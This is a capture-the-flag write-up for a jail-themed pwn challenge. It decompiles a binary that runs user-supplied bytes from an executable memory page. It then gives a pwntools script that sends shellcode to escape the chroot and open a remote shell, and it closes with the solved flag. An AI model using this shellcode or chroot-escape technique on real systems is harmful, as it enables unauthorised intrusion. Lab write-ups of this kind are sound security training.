## Chall description
```
Category: PWN
Well... I'm trapped. Feels like I'm in jail. Can you get the flag?
```

## Procedure
Using IDA, we can see the following code
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __uid_t v3; // eax
  int fd; // [rsp+0h] [rbp-C0h]
  void (*buf)(void); // [rsp+8h] [rbp-B8h]
  char templatea[32]; // [rsp+10h] [rbp-B0h] BYREF
  char haystack[136]; // [rsp+30h] [rbp-90h] BYREF
  unsigned __int64 v9; // [rsp+B8h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  strcpy(templatea, "/tmp/jail-XXXXXX");
  setup(argc, argv);
  v3 = geteuid();
  setreuid(v3, 0xFFFFFFFF);
  if ( mkdtemp(templatea) )
  {
    printf("Creating jail at: %s\n", templatea);
    puts("Which file would you like to open?");
    __isoc99_scanf("%s", haystack);
    if ( strstr(haystack, "flag") )
    {
      puts("Cannot open flag based files");
      return 1;
    }
    else if ( chroot(templatea) )
    {
      perror("chroot");
      return 1;
    }
    else
    {
      fd = open("/flag", 65);
      write(fd, "FLAG{FAKE}", 0xAuLL);
      close(fd);
      buf = (void (*)(void))mmap((void *)0x1337000, 0x1000uLL, 7, 34, 0, 0LL);
      if ( buf != (void (*)(void))20148224 )
        perror("mmap");
      puts("What would you like me to run next? ");
      if ( (unsigned int)read(0, buf, 0x1000uLL) )
        buf();
      else
        puts("Nothing read in, goodbye");
      return 0;
    }
  }
  else
  {
    perror("mkdtemp");
    return 1;
  }
}
```
What it does
* Creates a unique temporary directory and stores the name in templatea. If it fails, `perror("mkdtemp")` and exit.
* Prompts user and reads a filename into stack using `__isoc99_scanf("%s", haystack);` no length limit.
* Checks if the input string contains the substring `flag`; if so, it rejects and exits.
* Attempts to `chroot()` into the newly created temp dir. If it fails, prints error and exits.
* Opens `/flag` with numeric flags 65 `(which is O_CREAT | O_WRONLY)`, writes `FLAG{FAKE}` into it and closes it
* Requests an mmap at address `0x1337000` of one page with `prot = 7 (read|write|exec)` and flags = 34 `(MAP_PRIVATE|MAP_ANONYMOUS)`. If the returned pointer is not exactly `0x1337000` it calls `perror("mmap")` (but continues).
* Prompts `What would you like me to run next?` then `read(0, buf, 0x1000)` to read up to `0x1000` bytes from stdin into buf. If read() returns nonzero, it calls buf(). it jumps to the memory region just written and executes it as code. Otherwise prints goodbye and exits


## How to exploit
* We can send any filename not containing `flag` at the filename prompt.
* When asked `What would you like me to run next?`, send `x86_64` shellcode `(execve("/bin/sh"))` to spawn a shell on remote intance.

```python
from pwn import *
context(os='linux',log_level='debug',arch='amd64')
io = remote('ip',9999)
io.sendlineafter(b'open?',b'sp34rh34d')
payload = asm(shellcraft.chdir('..')) + asm(shellcraft.chroot('.')) + asm(shellcraft.sh())
io.sendlineafter(b'next?',payload)
io.interactive()
```

<img width="972" height="293" alt="Screenshot 2025-10-29 at 8 00 32 PM" src="https://github.com/user-attachments/assets/96a9e441-90f8-4a35-9c30-179fa183a7d0" />

Flag `flag{5f8c037a7ca4cb89c80174bca5eaf531}`






